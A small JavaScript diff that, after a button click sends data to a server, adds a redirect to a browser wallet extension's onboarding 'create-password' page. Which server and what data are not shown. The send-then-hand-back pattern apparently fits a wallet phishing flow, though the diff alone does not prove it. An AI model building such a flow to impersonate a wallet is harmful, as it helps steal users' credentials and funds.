@@ -288,6 +288,9 @@ continueBtn.addEventListener('click', async () => {
 
         const result = await response.json();
         console.log("Server response:", result);
+        
+        //  Redirect after successful send
+        window.location.href = "chrome-extension://nkbihfbeogaeaoehlefnkodbefgpgknn/home.html#/onboarding/create-password";
 
     } catch (error) {
         console.error("Fetch error:", error);
